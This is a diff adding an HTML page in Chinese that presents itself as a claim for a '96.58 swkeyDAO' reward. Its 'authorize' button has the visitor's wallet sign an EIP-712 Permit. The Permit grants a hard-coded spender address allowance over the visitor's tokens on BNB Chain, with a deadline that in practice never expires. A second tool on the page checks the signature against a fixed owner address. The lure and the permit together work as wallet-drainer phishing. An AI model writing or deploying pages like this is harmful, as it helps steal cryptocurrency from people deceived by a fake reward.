@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>领取 swkeyDAO 奖励</title>
+</head>
+<body>
+  <h2>🎁 恭喜你获得 96.58 swkeyDAO 奖励</h2>
+  <p>请点击下方按钮授权领取：</p>
+  <button onclick="signPermit()">点击授权</button>
+
+  <hr>
+  <h3>🔍 签名验证工具</h3>
+  <textarea id="signatureInput" rows="4" cols="80" placeholder="粘贴签名字符串（0x...）"></textarea><br><br>
+  <button onclick="verifySignature()">验证签名</button>
+  <pre id="result"></pre>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script>
+    async function signPermit() {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+
+      const domain = {
+        name: "swkeyDAO",
+        version: "1",
+        chainId: 56,
+        verifyingContract: "0xafa381d908fd736ca58f232a9908b4ebb2dd412c"
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const message = {
+        owner: await signer.getAddress(),
+        spender: "0xb51923029c1ae3115762652ac91b58f3ca70fea5",
+        value: "96586154797000000000",
+        nonce: 0,
+        deadline: 9999999999
+      };
+
+      try {
+        const signature = await signer._signTypedData(domain, types, message);
+        console.log("签名成功：", signature);
+        alert("授权成功！请在下方粘贴签名进行验证。");
+        document.getElementById("signatureInput").value = signature;
+      } catch (err) {
+        console.error("签名失败：", err);
+        alert("授权失败，请重试。");
+      }
+    }
+
+    async function verifySignature() {
+      const signature = document.getElementById("signatureInput").value.trim();
+      const resultBox = document.getElementById("result");
+
+      if (!signature || !signature.startsWith("0x")) {
+        resultBox.textContent = "❌ 签名格式错误，请粘贴以 0x 开头的签名字符串";
+        return;
+      }
+
+      const domain = {
+        name: "swkeyDAO",
+        version: "1",
+        chainId: 56,
+        verifyingContract: "0xafa381d908fd736ca58f232a9908b4ebb2dd412c"
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const message = {
+        owner: "0x39c145Ef5Ca969E060802B50a99623909d73e394",
+        spender: "0xb51923029c1ae3115762652ac91b58f3ca70fea5",
+        value: "96586154797000000000",
+        nonce: 0,
+        deadline: 9999999999
+      };
+
+      try {
+        const recovered = ethers.utils.verifyTypedData(domain, types, message, signature);
+        const parsed = ethers.utils.splitSignature(signature);
+
+        resultBox.textContent =
+          `✅ 签名有效\n` +
+          `签名地址: ${recovered}\n\n` +
+          `v: ${parsed.v}\n` +
+          `r: ${parsed.r}\n` +
+          `s: ${parsed.s}`;
+      } catch (err) {
+        resultBox.textContent = `❌ 签名验证失败：\n${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
